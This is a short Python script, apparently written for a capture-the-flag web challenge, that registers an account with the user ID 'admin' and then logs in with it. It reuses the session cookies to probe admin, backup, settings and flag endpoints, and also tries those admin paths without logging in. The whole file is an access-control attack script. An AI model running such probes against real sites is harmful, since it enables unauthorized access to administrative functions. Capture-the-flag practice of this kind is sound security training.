#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests

url = "http://8080-26908653-7324-41e9-98cb-8f7c72ff8626.challenge.ctfplus.cn/"

print("[*] CTF Exploit Automation")
print(f"  Target: {url}")

# Test 1: Complete admin flow
print("\n[Test 1] Complete admin flow")
r1 = requests.post(url + '/register', data={'uid': 'admin', 'username': 'adminuser', 'password': 'adminpass'}, timeout=5)
print(f"  Register: {r1.status_code}")
if r1.status_code == 200:
    print(f"  Response: {r1.text[:200]}")
    
    r2 = requests.post(url + '/login', data={'uid': 'admin', 'password': 'adminpass'}, timeout=5)
    print(f"  Login: {r2.status_code}")
    if r2.status_code != 405:
        print(f"  Login Response: {r2.text[:500]}")
        if 'flag' in r2.text.lower():
            print(f"  *** FLAG: {r2.text} ***")
            exit(0)
        
        # Try accessing admin endpoints
        cookies = r2.cookies.get_dict()
        print(f"  Cookies: {cookies}")
        
        for endpoint in ['/admin', '/manage', '/backup', '/settings', '/flag']:
            r3 = requests.get(url + endpoint, cookies=cookies, timeout=5)
            if r3.status_code == 200:
                print(f"  {endpoint}: {r3.status_code}, Length: {len(r3.text)}")
                if 'flag' in r3.text.lower():
                    print(f"  *** FLAG FOUND: {r3.text} ***")
                    exit(0)
                else:
                    print(f"  Response: {r3.text[:500]}")
            else:
                print(f"  {endpoint}: {r3.status_code}")

print("\n[Test 2] Direct admin endpoint access")
for endpoint in ['/admin', '/admin/backup', '/administrator', '/manage']:
    r = requests.get(url + endpoint, timeout=5)
    if r.status_code == 200:
        print(f"  {endpoint}: {r.status_code}")
        if 'flag' in r.text.lower():
            print(f"  *** FLAG FOUND: {r.text} ***")
            exit(0)
        print(f"  Response: {r.text[:500]}")

print("\nDone testing. No flag found.")
